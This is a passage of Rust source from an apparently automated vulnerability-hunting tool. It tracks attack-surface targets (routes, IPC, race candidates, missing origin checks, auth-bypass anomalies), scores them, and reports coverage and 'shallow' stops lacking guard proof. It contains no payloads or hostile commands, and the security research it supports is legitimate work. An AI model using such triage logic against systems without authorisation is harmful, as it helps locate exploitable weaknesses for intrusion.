            "invariant",
            "sanitiz",
        ]
        .iter()
        .any(|kw| r_low.contains(kw))
        || (!ev.is_empty() && r.len() >= 16);

    if has_guard_proof {
        return None;
    }
    if r.len() < 16 && ev.is_empty() {
        return Some("unbacked_short_reason");
    }
    let has_weak_refusal = [
        "400",
        "401",
        "403",
        "404",
        "405",
        "429",
        "502",
        "503",
        "timeout",
        "timed out",
        "refused",
        "skip",
        "later",
        "todo",
    ]
    .iter()
    .any(|kw| contains_ascii_word(&r_low, kw));
    if has_weak_refusal {
        return Some("shallow_refusal_without_guard_proof");
    }
    None
}

pub fn status_summary_json(state: &FrontierState, top_k: usize) -> Value {
    let mut per_axis: BTreeMap<String, (usize, usize, usize, usize)> = BTreeMap::new();
    let mut counts: HashMap<&'static str, usize> = HashMap::new();
    for it in &state.items {
        *counts.entry(it.status.as_str()).or_insert(0) += 1;
        let e = per_axis.entry(it.axis.clone()).or_insert((0, 0, 0, 0));
        match it.status {
            FrontierStatus::Unvisited => e.0 += 1,
            FrontierStatus::Probed => e.1 += 1,
            FrontierStatus::Stopped => e.2 += 1,
            FrontierStatus::Confirmed => e.3 += 1,
            FrontierStatus::Deferred => e.0 += 1,
        }
    }
    let mut unexplored_axes = Vec::new();
    let mut explored_axes = Vec::new();
    let mut axis_matrix = Vec::new();
    for (ax, (unv, prb, stp, cnf)) in &per_axis {
        if *prb + *stp + *cnf == 0 && *unv > 0 {
            unexplored_axes.push(ax.clone());
        } else {
            explored_axes.push(ax.clone());
        }
        axis_matrix.push(json!({
            "axis": ax,
            "unvisited": unv,
            "probed": prb,
            "stopped": stp,
            "confirmed": cnf,
        }));
    }
    let next_items: Vec<Value> = pick_next_diverse(state, top_k, &[])
        .into_iter()
        .map(|it| serde_json::to_value(it).unwrap_or(Value::Null))
        .collect();
    json!({
        "updated_at": state.updated_at,
        "source_roots": state.source_roots,
        "total": state.items.len(),
        "unvisited": *counts.get("unvisited").unwrap_or(&0),
        "probed": *counts.get("probed").unwrap_or(&0),
        "stopped": *counts.get("stopped").unwrap_or(&0),
        "confirmed": *counts.get("confirmed").unwrap_or(&0),
        "deferred": *counts.get("deferred").unwrap_or(&0),
        "explored_axes": explored_axes,
        "unexplored_axes": unexplored_axes,
        "axis_matrix": axis_matrix,
        "next": next_items,
    })
}

pub fn render_status_md(state: &FrontierState, top_k: usize) -> String {
    let summary = status_summary_json(state, top_k);
    let total = summary["total"].as_u64().unwrap_or(0);
    let unv = summary["unvisited"].as_u64().unwrap_or(0);
    let prb = summary["probed"].as_u64().unwrap_or(0);
    let stp = summary["stopped"].as_u64().unwrap_or(0);
    let cnf = summary["confirmed"].as_u64().unwrap_or(0);
    let unexp: Vec<&str> = summary["unexplored_axes"]
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();
    let exp: Vec<&str> = summary["explored_axes"]
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();

    let mut out = Vec::new();
    out.push(format!(
        "# FRONTIER COVERAGE (total={total}: unvisited={unv}, probed={prb}, stopped={stp}, confirmed={cnf})"
    ));
    out.push(format!(
        "**Unexplored Axes ({})**: {}",
        unexp.len(),
        if unexp.is_empty() {
            "(none)".to_string()
        } else {
            unexp.join(", ")
        }
    ));
    if !exp.is_empty() {
        out.push(format!(
            "**Explored Axes ({})**: {}",
            exp.len(),
            exp.join(", ")
        ));
    }
    let next = pick_next_diverse(state, top_k, &[]);
    if !next.is_empty() {
        out.push("\n## Next Diverse Unvisited Targets".to_string());
        for it in next {
            out.push(format!(
                "- `{}` [{}] `{}:{}` (`{}`) — {}",
                it.id,
                it.axis,
                it.target,
                it.line,
                it.symbol,
                clip(&it.snippet, 100)
            ));
        }
    }
    format!("{}\n", out.join("\n"))
}

pub fn compute_coverage_report(
    state: &FrontierState,
    top_k: usize,
    exclude_axes: &[String],
) -> Value {
    #[derive(Default)]
    struct AxCounts {
        total: usize,
        unvisited: usize,
        high_priority_unvisited: usize,
        probed: usize,
        stopped: usize,
        shallow_stopped: usize,
        confirmed: usize,
        deferred: usize,
    }

    let mut per_axis: BTreeMap<String, AxCounts> = BTreeMap::new();
    let mut unvisited = 0usize;
    let mut high_priority_unvisited = 0usize;
    let mut probed = 0usize;
    let mut stopped = 0usize;
    let mut confirmed = 0usize;
    let mut deferred = 0usize;
    let mut shallow_items: Vec<(FrontierItem, &'static str)> = Vec::new();

    for it in &state.items {
        let ax = per_axis.entry(it.axis.clone()).or_default();
        ax.total += 1;
        match it.status {
            FrontierStatus::Unvisited => {
                unvisited += 1;
                ax.unvisited += 1;
                if is_high_priority_guard(&it.guard_hint) {
                    high_priority_unvisited += 1;
                    ax.high_priority_unvisited += 1;
                }
            }
            FrontierStatus::Probed => {
                probed += 1;
                ax.probed += 1;
            }
            FrontierStatus::Stopped => {
                stopped += 1;
                ax.stopped += 1;
                if let Some(kind) = classify_shallow_stop(it) {
                    ax.shallow_stopped += 1;
                    shallow_items.push((it.clone(), kind));
                }
            }
            FrontierStatus::Confirmed => {
                confirmed += 1;
                ax.confirmed += 1;
            }
            FrontierStatus::Deferred => {
                deferred += 1;
                ax.deferred += 1;
            }
        }
    }

    let mut unexplored_axes = Vec::new();
    let mut explored_axes = Vec::new();
    let mut axis_breakdown = Vec::new();
    for (ax, c) in &per_axis {
        let explored = c.probed + c.stopped + c.confirmed;
        if explored == 0 && c.unvisited > 0 {
            unexplored_axes.push(ax.clone());
        } else if explored > 0 {
            explored_axes.push(ax.clone());
        }
        let cov_pct = (explored * 100) / c.total.max(1);
        axis_breakdown.push(json!({
            "axis": ax,
            "total": c.total,
            "unvisited": c.unvisited,
            "high_priority_unvisited": c.high_priority_unvisited,
            "probed": c.probed,
            "stopped": c.stopped,
            "shallow_stopped": c.shallow_stopped,
            "confirmed": c.confirmed,
            "deferred": c.deferred,
            "coverage_pct": cov_pct,
        }));
    }

    let total = state.items.len();
    let shallow_n = shallow_items.len();
    let pressure_score: u32 = if total == 0 {
        100
    } else {
        let p_axes = (unexplored_axes.len() * 15).min(45);
        let p_hp = (high_priority_unvisited * 5).min(30);
        let p_sh = (shallow_n * 6).min(25);
        (p_axes + p_hp + p_sh).min(100) as u32
    };

    let exhaustion_verdict = if total == 0 {
        "UNSCANNED_EMPTY_FRONTIER"
    } else if pressure_score >= 50 || !unexplored_axes.is_empty() || high_priority_unvisited >= 3 {
        "FALSE_EXHAUSTION_HIGH_PRESSURE"
    } else if pressure_score >= 20 || unvisited > 0 || shallow_n > 0 {
        "PARTIAL_COVERAGE"
    } else {
        "GENUINELY_SATURATED"
    };

    let total_axes = per_axis.len();
    let axis_coverage_pct = (explored_axes.len() * 100)
        .checked_div(total_axes)
        .unwrap_or(0);
    let item_coverage_pct = ((probed + stopped + confirmed) * 100)
        .checked_div(total)
        .unwrap_or(0);

    let limit = top_k.clamp(1, 20);
    let mut seen_ids: HashSet<String> = HashSet::new();
    let mut challenge_targets: Vec<Value> = Vec::new();
    let mut push_challenge = |it: &FrontierItem, kind: &str, shallow_kind: Option<&str>| {
        if challenge_targets.len() >= limit || !seen_ids.insert(it.id.clone()) {
            return;
        }
        let mut obj = serde_json::to_value(it).unwrap_or_else(|_| json!({}));
        if let Some(m) = obj.as_object_mut() {
            m.insert("challenge_kind".to_string(), json!(kind));
            if let Some(sk) = shallow_kind {
                m.insert("shallow_kind".to_string(), json!(sk));
            }
        }
        challenge_targets.push(obj);
    };

    // 1) Diverse unvisited high-priority items in unexplored axes first
    let unexplored_set: HashSet<&str> = unexplored_axes.iter().map(String::as_str).collect();
    let mut hp_unexp: Vec<&FrontierItem> = state
        .items
        .iter()
        .filter(|it| {
            it.status == FrontierStatus::Unvisited
                && unexplored_set.contains(it.axis.as_str())
                && is_high_priority_guard(&it.guard_hint)
        })
        .collect();
    hp_unexp.sort_by(|a, b| b.score.cmp(&a.score).then_with(|| a.axis.cmp(&b.axis)));
    let mut hp_axes_used: HashSet<&str> = HashSet::new();
    for it in &hp_unexp {
        if hp_axes_used.insert(it.axis.as_str()) {
            push_challenge(it, "unexplored_axis_high_priority", None);
        }
    }
    for it in &hp_unexp {
        push_challenge(it, "unexplored_axis_high_priority", None);
    }

    // 2) Diversity-picked remaining unvisited frontier nodes
    for it in pick_next_diverse(state, limit, exclude_axes) {
        push_challenge(it, "unvisited_frontier", None);
    }

    // 3) Shallow-stopped nodes lacking concrete guard proof
    for (it, sk) in &shallow_items {
        push_challenge(it, "shallow_stop_rechallenge", Some(sk));
    }

    let shallow_stopped_json: Vec<Value> = shallow_items
        .iter()
        .take(20)
        .map(|(it, sk)| {
            json!({
                "id": it.id,
                "axis": it.axis,
                "target": it.target,
                "line": it.line,
                "symbol": it.symbol,
                "reason": it.reason,
                "shallow_kind": sk,
            })
        })
        .collect();

    json!({
        "ok": true,
        "total": total,
        "unvisited": unvisited,
        "high_priority_unvisited": high_priority_unvisited,
        "probed": probed,
        "stopped": stopped,
        "shallow_stopped": shallow_n,
        "confirmed": confirmed,
        "deferred": deferred,
        "axis_coverage_pct": axis_coverage_pct,
        "item_coverage_pct": item_coverage_pct,
        "pressure_score": pressure_score,
        "exhaustion_verdict": exhaustion_verdict,
        "explored_axes": explored_axes,
        "unexplored_axes": unexplored_axes,
        "axis_breakdown": axis_breakdown,
        "shallow_stopped_items": shallow_stopped_json,
        "challenge_targets": challenge_targets,
        "verification_rule": "Confirm a concrete guard/invariant proof to clear a stop; never fabricate unverified claims.",
    })
}

pub fn render_coverage_md(rep: &Value, is_challenge: bool) -> String {
    let verdict = rep["exhaustion_verdict"].as_str().unwrap_or("UNKNOWN");
    let pressure = rep["pressure_score"].as_u64().unwrap_or(0);
    let ax_pct = rep["axis_coverage_pct"].as_u64().unwrap_or(0);
    let it_pct = rep["item_coverage_pct"].as_u64().unwrap_or(0);
    let total = rep["total"].as_u64().unwrap_or(0);
    let unv = rep["unvisited"].as_u64().unwrap_or(0);
    let hp_unv = rep["high_priority_unvisited"].as_u64().unwrap_or(0);
    let sh = rep["shallow_stopped"].as_u64().unwrap_or(0);
    let heading = if is_challenge {
        "# FRONTIER CHALLENGE"
    } else {
        "# FRONTIER COVERAGE MATRIX"
    };
    let mut out = vec![
        format!(
            "{heading} [{verdict}] (pressure={pressure}/100 | axis_cov={ax_pct}% | item_cov={it_pct}% | total={total}, unvisited={unv}, hp_unvisited={hp_unv}, shallow_stops={sh})"
        ),
    ];
    if let Some(unexp) = rep["unexplored_axes"].as_array() {
        let names: Vec<&str> = unexp.iter().filter_map(Value::as_str).collect();
        if !names.is_empty() {
            out.push(format!(
                "**Unexplored Axes ({})**: {}",
                names.len(),
                names.join(", ")
            ));
        }
    }
    if let Some(rows) = rep["axis_breakdown"].as_array() {
        for r in rows {
            out.push(format!(
                "- `{}`: {}% (tot={}, unv={}, hp={}, prb={}, stp={}, sh={}, cnf={})",
                r["axis"].as_str().unwrap_or(""),
                r["coverage_pct"].as_u64().unwrap_or(0),
                r["total"].as_u64().unwrap_or(0),
                r["unvisited"].as_u64().unwrap_or(0),
                r["high_priority_unvisited"].as_u64().unwrap_or(0),
                r["probed"].as_u64().unwrap_or(0),
                r["stopped"].as_u64().unwrap_or(0),
                r["shallow_stopped"].as_u64().unwrap_or(0),
                r["confirmed"].as_u64().unwrap_or(0),
            ));
        }
    }
    if is_challenge {
        if let Some(tgts) = rep["challenge_targets"].as_array() {
            if !tgts.is_empty() {
                out.push("\n## Challenge Obligations".to_string());
                for t in tgts {
                    out.push(format!(
                        "- [{}] `{}` [{}] `{}:{}` (`{}` | guard_hint=`{}`)",
                        t["challenge_kind"].as_str().unwrap_or(""),
                        t["id"].as_str().unwrap_or(""),
                        t["axis"].as_str().unwrap_or(""),
                        t["target"].as_str().unwrap_or(""),
                        t["line"].as_u64().unwrap_or(0),
                        t["symbol"].as_str().unwrap_or(""),
                        t["guard_hint"].as_str().unwrap_or(""),
                    ));
                }
            }
        }
        out.push(format!(
            "\n*Rule: {}*",
            rep["verification_rule"].as_str().unwrap_or("")
        ));
    }
    format!("{}\n", out.join("\n"))
}

fn map_sink_to_axis(sink: &str) -> &'static str {
    let low = sink.to_ascii_lowercase();
    if low.contains("exec")
        || low.contains("spawn")
        || low == "system"
        || low == "popen"
        || low.contains("createprocess")
    {
        "exec_spawn"
    } else if low.contains("file") || low.contains("stream") {
        "fs_path_io"
    } else if matches!(low.as_str(), "prepare" | "query" | "execute") {
        "sql_query"
    } else if low.contains("html")
        || low == "eval"
        || low == "function"
        || low.contains("openexternal")
    {
        "dom_client"
    } else if low.contains("postmessage") || low == "sendsync" || low == "invoke" {
        "ipc_pipe_proto"
    } else {
        "variant_outlier"
    }
}

struct ItemDraft<'a> {
    axis: &'a str,
    module: &'a str,
    target: &'a str,
    line: usize,
    symbol: &'a str,
    snippet: &'a str,
    guard_hint: &'a str,
    score: u32,
}

fn make_frontier_item(d: ItemDraft<'_>) -> FrontierItem {
    let id = format!(
        "{}:{}",
        d.axis,
        fnv1a_hex(&format!(
            "{}|{}|{}",
            d.axis,
            d.target,
            d.symbol.to_ascii_lowercase()
        ))
    );
    FrontierItem {
        id,
        axis: d.axis.to_string(),
        module: clip(d.module, 64),
        target: d.target.to_string(),
        line: d.line,
        symbol: clip(d.symbol, 96),
        snippet: clip(d.snippet, 180),
        guard_hint: clip(d.guard_hint, 96),
        score: d.score,
        status: FrontierStatus::Unvisited,
        reason: String::new(),
        evidence_ref: String::new(),
        updated_at: now_iso_utc(),
    }
}

fn ingest_js_surface_obj(
    surf_inner: &Value,
    src_label: &str,
    push_item: &mut dyn FnMut(ItemDraft<'_>),
) -> &'static str {
    if let Some(diff) = surf_inner.get("diff").filter(|d| d.is_object()) {
        for r in diff["new_routes"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
        {
            let method = r["method"].as_str().unwrap_or("ANY");
            let path = r["path"].as_str().unwrap_or("").trim();
            if path.is_empty() {
                continue;
            }
            let file = r["file"].as_str().unwrap_or(src_label);
            let line = r["line"].as_u64().unwrap_or(0) as usize;
            let sym = format!("{method} {path}");
            push_item(ItemDraft {
                axis: "web_api_route",
                module: file,
                target: path,
                line,
                symbol: &sym,
                snippet: &sym,
                guard_hint: "NEW_DIFF",
                score: 95,
            });
        }
        for g in diff["new_graphql"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
        {
            let kind = g["kind"].as_str().unwrap_or("op");
            let name = g["name"].as_str().unwrap_or("").trim();
            if name.is_empty() {
                continue;
            }
            let file = g["file"].as_str().unwrap_or(src_label);
            let line = g["line"].as_u64().unwrap_or(0) as usize;
            let sym = format!("{kind} {name}");
            push_item(ItemDraft {
                axis: "graphql_op",
                module: file,
                target: name,
                line,
                symbol: &sym,
                snippet: &sym,
                guard_hint: "NEW_DIFF",
                score: 95,
            });
        }
        for w in diff["new_ws_sse"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
        {
            let kind = w["kind"].as_str().unwrap_or("ws");
            let ep = w["endpoint"].as_str().unwrap_or("").trim();
            if ep.is_empty() {
                continue;
            }
            let file = w["file"].as_str().unwrap_or(src_label);
            let line = w["line"].as_u64().unwrap_or(0) as usize;
            push_item(ItemDraft {
                axis: "net_listen_rpc",
                module: file,
                target: ep,
                line,
                symbol: kind,
                snippet: ep,
                guard_hint: "NEW_DIFF",
                score: 95,
            });
        }
        for ipc in diff["new_ipc_sinks"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
        {
            let kind = ipc["kind"].as_str().unwrap_or("ipc");
            let file = ipc["file"].as_str().unwrap_or(src_label);
            let line = ipc["line"].as_u64().unwrap_or(0) as usize;
            let snip = ipc["snippet"].as_str().unwrap_or(kind);
            let tgt = format!("{file}:L{line}");
            push_item(ItemDraft {
                axis: "ipc_pipe_proto",
                module: file,
                target: &tgt,
                line,
                symbol: kind,
                snippet: snip,
                guard_hint: "NEW_DIFF",
                score: 95,
            });
        }
        return "routes_diff";
    }

    for r in surf_inner["routes"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(20)
    {
        let method = r["method"].as_str().unwrap_or("ANY");
        let path = r["path"].as_str().unwrap_or("").trim();
        if path.is_empty() {
            continue;
        }
        let file = r["file"].as_str().unwrap_or(src_label);
        let line = r["line"].as_u64().unwrap_or(0) as usize;
        let risk = r["risk_score"].as_u64().unwrap_or(0).min(20) as u32;
        let tags: Vec<&str> = r["tags"]
            .as_array()
            .map(|a| a.iter().filter_map(Value::as_str).collect())
            .unwrap_or_default();
        let sym = format!("{method} {path}");
        let gh = tags.join(",");
        push_item(ItemDraft {
            axis: "web_api_route",
            module: file,
            target: path,
            line,
            symbol: &sym,
            snippet: &sym,
            guard_hint: &gh,
            score: 75 + risk,
        });
    }
    for rc in surf_inner["race_candidates"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(8)
    {
        let method = rc["method"].as_str().unwrap_or("POST");
        let path = rc["path"].as_str().unwrap_or("").trim();
        if path.is_empty() {
            continue;
        }
        let file = rc["file"].as_str().unwrap_or(src_label);
        let line = rc["line"].as_u64().unwrap_or(0) as usize;
        let sym = format!("RACE {method} {path}");
        push_item(ItemDraft {
            axis: "race_toctou",
            module: file,
            target: path,
            line,
            symbol: &sym,
            snippet: &sym,
            guard_hint: "RACE_CANDIDATE",
            score: 92,
        });
    }
    for fc in surf_inner["flow_candidates"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(6)
    {
        let stem = fc["stem"].as_str().unwrap_or("").trim();
        if stem.is_empty() {
            continue;
        }
        let steps_txt: Vec<String> = fc["steps"]
            .as_array()
            .map(|a| {
                a.iter()
                    .map(|s| {
                        format!(
                            "{} {}",
                            s["method"].as_str().unwrap_or(""),
                            s["path"].as_str().unwrap_or("")
                        )
                    })
                    .collect()
            })
            .unwrap_or_default();
        let snip = steps_txt.join(" -> ");
        push_item(ItemDraft {
            axis: "stateful_flow",
            module: src_label,
            target: stem,
            line: 0,
            symbol: "FLOW",
            snippet: &snip,
            guard_hint: "FLOW_CANDIDATE",
            score: 90,
        });
    }
    for g in surf_inner["graphql_ops"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(15)
    {
        let kind = g["kind"].as_str().unwrap_or("op");
        let name = g["name"].as_str().unwrap_or("").trim();
        if name.is_empty() {
            continue;
        }
        let file = g["file"].as_str().unwrap_or(src_label);
        let line = g["line"].as_u64().unwrap_or(0) as usize;
        let sym = format!("{kind} {name}");
        push_item(ItemDraft {
            axis: "graphql_op",
            module: file,
            target: name,
            line,
            symbol: &sym,
            snippet: &sym,
            guard_hint: "",
            score: 88,
        });
    }
    for w in surf_inner["ws_sse_endpoints"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(15)
    {
        let kind = w["kind"].as_str().unwrap_or("ws");
        let ep = w["endpoint"].as_str().unwrap_or("").trim();
        if ep.is_empty() {
            continue;
        }
        let file = w["file"].as_str().unwrap_or(src_label);
        let line = w["line"].as_u64().unwrap_or(0) as usize;
        push_item(ItemDraft {
            axis: "net_listen_rpc",
            module: file,
            target: ep,
            line,
            symbol: kind,
            snippet: ep,
            guard_hint: "",
            score: 88,
        });
    }
    for pm in surf_inner["post_message_handlers"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .filter(|p| p["missing_origin_check"].as_bool().unwrap_or(false))
        .take(12)
    {
        let file = pm["file"].as_str().unwrap_or(src_label);
        let line = pm["line"].as_u64().unwrap_or(0) as usize;
        let snip = pm["snippet"].as_str().unwrap_or("postMessage");
        let tgt = format!("{file}:L{line}");
        push_item(ItemDraft {
            axis: "webview_browser",
            module: file,
            target: &tgt,
            line,
            symbol: "postMessage",
            snippet: snip,
            guard_hint: "MISSING-ORIGIN-CHECK",
            score: 94,
        });
    }
    for ipc in surf_inner["local_server_and_ipc"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
        .iter()
        .take(15)
    {
        let kind = ipc["kind"].as_str().unwrap_or("ipc");
        let file = ipc["file"].as_str().unwrap_or(src_label);
        let line = ipc["line"].as_u64().unwrap_or(0) as usize;
        let snip = ipc["snippet"].as_str().unwrap_or(kind);
        let gh = if ipc["missing_origin_or_auth"].as_bool().unwrap_or(false) {
            "NO-ORIGIN-OR-AUTH-CHECK"
        } else {
            ""
        };
        let tgt = format!("{file}:L{line}");
        push_item(ItemDraft {
            axis: "ipc_pipe_proto",
            module: file,
            target: &tgt,
            line,
            symbol: kind,
            snippet: snip,
            guard_hint: gh,
            score: 92,
        });
    }
    "routes"
}

pub fn ingest_tool_json_str(
    state: &mut FrontierState,
    raw: &str,
    kind_hint: Option<&str>,
) -> Result<(String, usize, usize), String> {
    let (kind, added, skipped, _) = ingest_tool_json_str_with_excludes(state, raw, kind_hint, &[])?;
    Ok((kind, added, skipped))
}

pub fn ingest_tool_json_str_with_excludes(
    state: &mut FrontierState,
    raw: &str,
    kind_hint: Option<&str>,
    excludes: &[String],
) -> Result<(String, usize, usize, usize), String> {
    let matcher = FrontierExcludeMatcher::compile(excludes)?;
    let val: Value = serde_json::from_str(raw).map_err(|e| format!("invalid JSON: {e}"))?;
    let hint = kind_hint
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty() && s != "auto");

    let surf_inner = val.get("surface").filter(|v| v.is_object()).unwrap_or(&val);
    let is_variants = hint.as_deref() == Some("variants")
        || (val.get("siblings").is_some() && val.get("target_sinks").is_some());
    let is_http_mutate = hint.as_deref() == Some("http_mutate_matrix")
        || val.get("mode").and_then(Value::as_str) == Some("http_mutate_matrix")
        || val.get("anomalies").is_some_and(Value::is_array);
    let is_ai_surface = hint.as_deref() == Some("ai_surface")
        || val.get("mode").and_then(Value::as_str) == Some("ai_surface")
        || (val.get("counts_by_category").is_some() && val.get("findings").is_some());
    let is_archive_surface = hint.as_deref() == Some("archive_surface")
        || surf_inner.get("electron_security_flags").is_some()
        || surf_inner.get("manifest_risks").is_some()
        || surf_inner.get("archive_kind").is_some();
    let is_bin_surface = hint.as_deref() == Some("surface")
        || (surf_inner.get("artifacts").is_some()
            && surf_inner.get("import_risk_buckets").is_some());
    let is_routes = hint.as_deref() == Some("routes")
        || (surf_inner.get("routes").is_some()
            || surf_inner.get("graphql_ops").is_some()
            || surf_inner.get("ws_sse_endpoints").is_some()
            || surf_inner.get("race_candidates").is_some()
            || surf_inner.get("flow_candidates").is_some());

    if let Some(root) = val
        .get("root")
        .or_else(|| val.get("target"))
        .and_then(Value::as_str)
        .filter(|s| !s.is_empty())
    {
        if !state.source_roots.iter().any(|r| r == root) {
            state.source_roots.push(root.to_string());
        }
    }

    let mut added = 0usize;
    let mut skipped = 0usize;
    let mut filtered = 0usize;
    let mut push_item = |d: ItemDraft<'_>| {
        let item = make_frontier_item(d);
        if matcher.matches(&item) {
            filtered += 1;
            return;
        }
        if upsert_item(state, item) {
            added += 1;
        } else {
            skipped += 1;
        }
    };

    if is_variants {
        if let Some(sibs) = val.get("siblings").and_then(Value::as_array) {
            for s in sibs {
                let taint = s["arg_taint"].as_str().unwrap_or("");
                if taint == "CONST_LITERAL" {
                    continue;
                }
                let guard = s["guard_placement"].as_str().unwrap_or("UNGUARDED");
                let is_out = s["is_outlier"].as_bool().unwrap_or(false);
                if !is_out && guard == "GUARD_BEFORE" {
                    continue;
                }
                let file = s["file"].as_str().unwrap_or("").trim();
                let func = s["function"].as_str().unwrap_or("").trim();
                let sink = s["sink"].as_str().unwrap_or("").trim();
                if file.is_empty() || sink.is_empty() {
                    continue;
                }
                let line = s["sink_line"].as_u64().unwrap_or(0) as usize;
                let axis = map_sink_to_axis(sink);
                let sym = format!("{func}->{sink}");
                let gh = if taint.is_empty() {
                    guard.to_string()
                } else {
                    format!("{guard},{taint}")
                };
                let score = if guard == "UNGUARDED" && taint == "PARAM_TAINTED" {
                    96
                } else if guard == "UNGUARDED" || guard == "GUARD_AFTER" {
                    90
                } else {
                    82
                };
                let preview = s["arg_preview"].as_str().unwrap_or("");
                let snip = if preview.is_empty() {
                    format!("{func} calls {sink}")
                } else {
                    format!("{sink}({preview})")
                };
                push_item(ItemDraft {
                    axis,
                    module: file,
                    target: file,
                    line,
                    symbol: &sym,
                    snippet: &snip,
                    guard_hint: &gh,
                    score,
                });
            }
        }
        return Ok(("variants".to_string(), added, skipped, filtered));
    }

    if is_http_mutate {
        let base_tgt = val
            .get("target")
            .and_then(Value::as_str)
            .unwrap_or("http")
            .trim();
        for a in val["anomalies"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(25)
        {
            let kind = a["kind"].as_str().unwrap_or("ANOMALY");
            let label = a["label"].as_str().unwrap_or("mut");
            let url = a["url"].as_str().unwrap_or(base_tgt);
            let method = a["method"].as_str().unwrap_or("GET");
            let detail = a["detail"].as_str().unwrap_or(label);
            let sym = format!("{method} {label}");
            let score = match kind {
                "AUTH_OR_ROUTE_BYPASS" | "SENTINEL_LEAK" | "PARSER_DESYNC_ECHO" => 96,
                "GRAPHQL_BATCH_OR_ALIAS_ALLOWED" | "SERVER_FAULT_5XX" => 93,
                _ => 88,
            };
            push_item(ItemDraft {
                axis: "web_parser_desync",
                module: base_tgt,
                target: url,
                line: 0,
                symbol: &sym,
                snippet: detail,
                guard_hint: kind,
                score,
            });
        }
        return Ok(("http_mutate_matrix".to_string(), added, skipped, filtered));
    }

    if is_ai_surface {
        let root_lbl = val
            .get("root")
            .and_then(Value::as_str)
            .unwrap_or("ai_repo")
            .trim();
        for f in val["findings"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(50)
        {
            let cat = f["category"].as_str().unwrap_or("AI_SURFACE");
            let sev = f["severity"].as_str().unwrap_or("MEDIUM");
            let file = f["file"].as_str().unwrap_or(root_lbl);
            let line = f["line"].as_u64().unwrap_or(0) as usize;
            let sym = f["symbol"].as_str().unwrap_or(cat);
            let snip = f["snippet"].as_str().unwrap_or(cat);
            let gh = f["guard_hint"].as_str().unwrap_or(sev);
            let axis = match cat {
                "IDE_WORKSPACE_TRUST_BYPASS" => "loader_plugin_ext",
                "AI_MARKDOWN_WEBVIEW_EXFIL" => "webview_browser",
                _ => "ai_agent_mcp",
            };
            let score = if sev == "HIGH" { 95 } else { 90 };
            push_item(ItemDraft {
                axis,
                module: file,
                target: file,
                line,
                symbol: sym,
                snippet: snip,
                guard_hint: gh,
                score,
            });
        }
        return Ok(("ai_surface".to_string(), added, skipped, filtered));
    }

    if is_archive_surface {
        let arch_label = surf_inner
            .get("target")
            .or_else(|| val.get("target"))
            .and_then(Value::as_str)
            .unwrap_or("archive")
            .trim();
        for fl in surf_inner["electron_security_flags"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(25)
        {
            let kind = fl["kind"].as_str().unwrap_or("electron_flag");
            let sev = fl["severity"].as_str().unwrap_or("MEDIUM");
            let entry = fl["entry_path"].as_str().unwrap_or(arch_label);
            let line = fl["line"].as_u64().unwrap_or(0) as usize;
            let snip = fl["snippet"].as_str().unwrap_or(kind);
            let score = if sev == "HIGH" { 95 } else { 88 };
            let tgt = format!("{arch_label}!{entry}");
            push_item(ItemDraft {
                axis: "webview_browser",
                module: entry,
                target: &tgt,
                line,
                symbol: kind,
                snippet: snip,
                guard_hint: sev,
                score,
            });
        }
        for h in surf_inner["ipc_handlers"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(20)
        {
            let entry = h["entry_path"].as_str().unwrap_or(arch_label);
            let line = h["line"].as_u64().unwrap_or(0) as usize;
            let snip = h["snippet"].as_str().unwrap_or("ipcMain");
            let tgt = format!("{arch_label}!{entry}");
            push_item(ItemDraft {
                axis: "ipc_pipe_proto",
                module: entry,
                target: &tgt,
                line,
                symbol: "ipc_handler",
                snippet: snip,
                guard_hint: "UNGUARDED",
                score: 92,
            });
        }
        for mr in surf_inner["manifest_risks"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(15)
        {
            let kind = mr["kind"].as_str().unwrap_or("manifest_risk");
            let entry = mr["entry_path"].as_str().unwrap_or(arch_label);
            let det = mr["detail"].as_str().unwrap_or(kind);
            let sev = mr["severity"].as_str().unwrap_or("MEDIUM");
            let tgt = format!("{arch_label}!{entry}");
            push_item(ItemDraft {
                axis: "loader_plugin_ext",
                module: entry,
                target: &tgt,
                line: 0,
                symbol: kind,
                snippet: det,
                guard_hint: sev,
                score: 90,
            });
        }
        for nb in surf_inner["native_bins"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or(&[])
            .iter()
            .take(6)
        {
            let path = nb["path"].as_str().unwrap_or("").trim();
            if path.is_empty() {
                continue;
            }
            let tgt = format!("{arch_label}!{path}");
            push_item(ItemDraft {
                axis: "binary_surface",
                module: path,
                target: &tgt,
                line: 0,
                symbol: "native_bin",
                snippet: path,
                guard_hint: "",
                score: 84,
            });
        }
        if let Some(js) = surf_inner.get("js_surface").filter(|v| v.is_object()) {
            ingest_js_surface_obj(js, arch_label, &mut push_item);
        }
        return Ok(("archive_surface".to_string(), added, skipped, filtered));
    }

    if is_bin_surface {
        let bin_label = val
            .get("target")
            .and_then(Value::as_str)
            .unwrap_or("binary")
            .trim();
        if let Some(arts) = surf_inner.get("artifacts").and_then(Value::as_object) {
            for (cat, arr_v) in arts {
                let (axis, score) = match cat.as_str() {
                    "named_pipes" | "rpc_endpoints" => ("ipc_pipe_proto", 90u32),
                    "urls" | "uri_schemes" => ("net_listen_rpc", 86u32),
